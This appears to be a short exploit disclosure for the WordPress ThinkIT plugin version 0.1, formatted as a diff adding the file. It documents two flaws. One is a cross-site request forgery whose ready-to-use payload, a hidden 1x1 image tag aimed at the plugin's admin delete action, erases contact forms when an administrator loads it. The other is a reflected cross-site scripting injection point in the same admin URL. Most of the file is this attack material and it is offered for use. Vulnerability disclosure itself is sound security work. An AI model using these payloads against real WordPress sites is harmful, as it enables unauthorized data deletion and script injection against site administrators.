@@ -1,0 +1,35 @@
+###################################################################################################################################
+# Exploit Title: Wordpress ThinkIT plugin - CSRF / XSS
+# Date: 2013 15 August
+# Exploit Author: Yashar shahinzadeh
+# Special thanks to Mormoroth
+# Credit goes for: http://y-shahinzadeh.ir & ha.cker.ir
+# Vendor Homepage: http://thinkoverit.com/
+# Tested on: Linux & Windows, PHP 5.2.9
+# Affected Version :  0.1
+#
+# Contacts: { http://Twitter.com/YShahinzadeh , http://y-shahinzadeh.ir , http://Twitter.com/Mormoroth , http://mormoroth.ir }
+###################################################################################################################################
+
+Summary:
+========
+1. CSRF - Delete a form
+2. Cross site scripting
+
+
+1. CSRF - Delete a form:
+========================
+
+Contact form ID can be easily understood from HTML page source, <input type="hidden" value="[ID]" name="toit-form-id"></input>, which [ID] is the form ID, following crafted exploit may be used so as to delete form completely:
+
+<img src="http://[WP]/wp-admin/admin.php?toitcf_current_id=[ID]&action=delete&page=toitcf" width="1" height="1">
+
+Obviously, ID must be replaced.
+
+
+2. Cross site scripting:
+========================
+http://[WP]/wordpress/wp-admin/admin.php?toitcf_current_id=[XSS]&page=toitcf
+
+
+/** Yasshar shahinzadeh **/
